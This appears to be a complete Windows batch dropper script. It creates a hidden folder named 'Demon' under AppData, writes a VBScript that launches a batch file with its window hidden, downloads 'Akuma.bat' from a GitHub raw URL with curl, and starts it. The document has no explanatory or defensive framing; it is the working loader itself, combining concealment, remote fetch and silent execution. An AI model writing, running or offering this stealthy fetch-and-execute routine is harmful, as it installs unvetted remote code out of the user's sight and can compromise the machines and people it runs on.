@echo off
rmdir /s /q %AppData%\Demon
mkdir %AppData%\Demon
attrib +h %AppData%\Demon
echo Set objShell = CreateObject("WScript.Shell") >> %AppData%\Demon\Demon.vbs
echo objShell.Run "%AppData%\Demon\Akuma.bat", 0, False >> %AppData%\Demon\Demon.vbs
curl -L https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %AppData%\Demon\akuma.bat
start %AppData%\Demon\Demon.vbs
exit
